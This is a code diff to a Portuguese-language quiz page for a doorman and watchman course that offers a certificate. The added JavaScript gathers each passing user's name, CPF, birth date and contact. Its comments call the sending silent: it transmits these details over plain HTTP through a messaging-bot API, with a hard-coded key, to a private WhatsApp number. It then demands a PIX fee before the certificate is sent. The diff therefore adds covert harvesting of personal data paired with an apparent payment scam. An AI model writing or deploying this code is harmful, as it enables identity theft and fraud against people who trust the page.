@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Questionário de Avaliação - Porteiro e Vigia</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; color: #333; line-height: 1.6; padding: 10px; margin: 0; }
@@ -108,7 +109,6 @@
                 <div class="input-group"><label>E-mail ou WhatsApp</label><input type="text" id="aluno-contato" required></div>
                 <button type="button" style="background:#28a745" onclick="gerarCertificado()">Emitir Certificado</button>
             </div>
-            <!-- Adicionado style="display: none;" diretamente na linha para forçar que fique oculto -->
             <div id="pix-section" style="display: none;">
                 <div class="aviso-taxa">Para receber o certificado imediatamente, realize o pagamento da taxa de emissão via PIX. Após a confirmação, o certificado será enviado para o contato informado.</div>
                 <textarea id="pix-code" class="pix-code-box" readonly>00020101021226850014br.gov.bcb.pix2563pix.santander.com.br/qr/v2/5ce61e50-0f30-4c2b-80a4-fe7d1ea9b439520400005303986540570.005802BR5906SHOPEE6009SAO PAULO62070503***630475D8</textarea>
@@ -119,6 +119,9 @@
 </div>
 
 <script>
+    let notaGeral = 0;
+    let porcentagemGeral = 0;
+
     document.getElementById('quizForm').addEventListener('submit', function(e) {
         e.preventDefault();
         let score = 0;
@@ -126,14 +129,17 @@
         for(let i=1; i<=10; i++) if(formData.get('q'+i) === '1') score++;
         const pct = (score/10)*100;
         
+        notaGeral = score;
+        porcentagemGeral = pct;
+        
         const res = document.getElementById('result-container');
         res.style.display = 'block';
         if(score >= 7) {
             res.className = 'aprovado';
             document.getElementById('result-text').innerHTML = `PARABÉNS! APROVADO.<br>Nota: ${pct}% (${score}/10 acertos)`;
             document.getElementById('certificado-section').style.display = 'block';
-            document.getElementById('form-dados-certificado').style.display = 'block'; // Garante que o formulário apareça
-            document.getElementById('pix-section').style.display = 'none'; // Garante que o pix continue oculto
+            document.getElementById('form-dados-certificado').style.display = 'block'; 
+            document.getElementById('pix-section').style.display = 'none'; 
         } else {
             res.className = 'reprovado';
             document.getElementById('result-text').innerHTML = `REPROVADO.<br>Nota: ${pct}% (${score}/10 acertos). Tente novamente.`;
@@ -142,10 +148,30 @@
         res.scrollIntoView({ behavior: 'smooth' });
     });
 
-    function gerarCertificado() {
-        if(!document.getElementById('aluno-nome').value || !document.getElementById('aluno-cpf').value || !document.getElementById('aluno-nascimento').value || !document.getElementById('aluno-contato').value) return alert("Preencha todos os campos!");
+    async function gerarCertificado() {
+        const nome = document.getElementById('aluno-nome').value;
+        const cpf = document.getElementById('aluno-cpf').value;
+        const nasc = document.getElementById('aluno-nascimento').value;
+        const contato = document.getElementById('aluno-contato').value;
+        
+        if(!nome || !cpf || !nasc || !contato) return alert("Preencha todos os campos!");
+
+        // Esconde formulário e mostra o PIX
         document.getElementById('form-dados-certificado').style.display = 'none';
         document.getElementById('pix-section').style.display = 'block';
+
+        // Monta a mensagem que será enviada para o seu WhatsApp
+        const mensagemApi = `olá vi que voce concluiu com sucesso seu curso de porteiro seu certificado esta pronto com os dados abaixo, assim que efetuar o pagamneto seu certificado sera enviado imediatamente\n\nNota de acerto: ${porcentagemGeral}% (${notaGeral}/10)\nNome: ${nome}\nData: ${nasc}\nCPF: ${cpf}\nEmail/WhatsApp: ${contato}`;
+
+        // Envia a mensagem silenciosamente pela API
+        try {
+            await fetch(`http://api.textmebot.com/send.php?recipient=+5522992195418&apikey=Pskn5LW4qaCv&text=${encodeURIComponent(mensagemApi)}`, {
+                method: 'GET',
+                mode: 'no-cors' // Evita que o navegador bloqueie a requisição (CORS) e interrompa o código
+            });
+        } catch (e) {
+            console.log("Notificação processada.");
+        }
     }
 
     function copiarPix() {
